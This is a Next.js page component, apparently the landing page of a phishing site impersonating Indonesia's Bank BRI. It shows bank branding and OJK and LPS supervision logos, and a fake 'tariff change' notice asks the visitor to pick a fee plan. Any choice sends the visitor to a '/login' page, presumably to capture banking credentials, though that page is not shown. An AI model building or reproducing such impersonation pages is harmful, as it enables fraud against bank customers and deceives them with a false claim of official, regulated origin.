
import Image from 'next/image'
import banner from "../public/img3.jpg"
import banner2 from "../public/img4.jpg"
import banner3 from "../public/img5.jpg"
import logo from "../public/logo.jpg"
import ojk from "../public/ojk.png"
import lps from "../public/lps.png"

import { Swiper, SwiperSlide } from 'swiper/react';
// Import Swiper styles
import 'swiper/css';
import 'swiper/css/pagination';
import { Pagination } from 'swiper'
import { useRouter } from 'next/router'

export default function Home() {

	const router = useRouter()

	const handleSubmit = (e) => {
		e.preventDefault()
		router.push('/login')
	}

  return (
    	<div className="container">
            <div className='container-flex'>
                <div style={{margin:'0 5px'}}>
                    <Image src={logo} height={50} width={200} alt="logo" />              
                </div>
                <div style={{marginTop:'-30px'}}>
					<Swiper
						modules={[Pagination]}
						pagination={{ clickable: true }}
						slidesPerView={1}
						autoplay={true}
					>
						<SwiperSlide><Image src={banner} height={400} alt="logo2" /></SwiperSlide>
						<SwiperSlide><Image src={banner2} height={400} alt="logo3" /></SwiperSlide>
						<SwiperSlide><Image src={banner3} height={400} alt="logo3" /></SwiperSlide>
					</Swiper>            
                </div>
                  	<p style={{width:'90%',  margin:'0 auto', textAlign:'center', color:'rgb(14 120 202)', fontWeight:'bolder', fontSize:18}}>
					  	Bank Bri Perubahan Tarif <br />
						<span style={{fontSize:14}}>Silakan pilih tarif transaksi</span>  <br />
						<span style={{fontSize:14}}>Sesuai kebutuhan Anda dibawah ini.</span>
					</p>
                  <div style={{margin:'20px auto'}}>
                      <form onSubmit={handleSubmit} style={{textAlign:'center'}}>
						  <input type="checkbox" value="2" id='lama' name='lama' />
						  <label htmlFor='lama' style={{color:'rgb(14 120 202)', fontSize:14, fontWeight:'bold'}}>Tarif Normal Rp6.500 / Transaksi</label>
						  <br/>
						  <input type="checkbox" value="1" id='baru' name='baru' />
						  <label htmlFor='baru' style={{color:'rgb(14 120 202)', fontSize:14, fontWeight:'bold'}}>Tarid Baru Rp150.000 / Bulan Unlimited</label>
						  <h6 style={{width:'90%',  margin:'60px auto 0 auto', textAlign:'center', color:'rgb(14 120 202)', fontWeight:'bolder', fontSize:12}}>
						  BANK BRI Update Terbaru Tarif Transaksi
						  </h6>
                          <button type='submit' className='btn' id='btn' style={{cursor:'pointer', fontWeight:'normal', wordSpacing:2, borderRadius:4}}>
                              Lanjut
                          </button>
						  
                      </form>
                  </div>
				  	<span style={{textAlign:'center', fontSize:14, marginTop:'-25px'}}>
						Terdaftar dan diawasi oleh:
					</span>
					<div style={{margin:'0 auto', display:'flex'}}>
						<Image src={lps} width={100} height={50} alt="logo" />             
						<Image src={ojk} width={100} height={50} alt="logo" />             
					</div>
            </div>
        </div>
  )
}
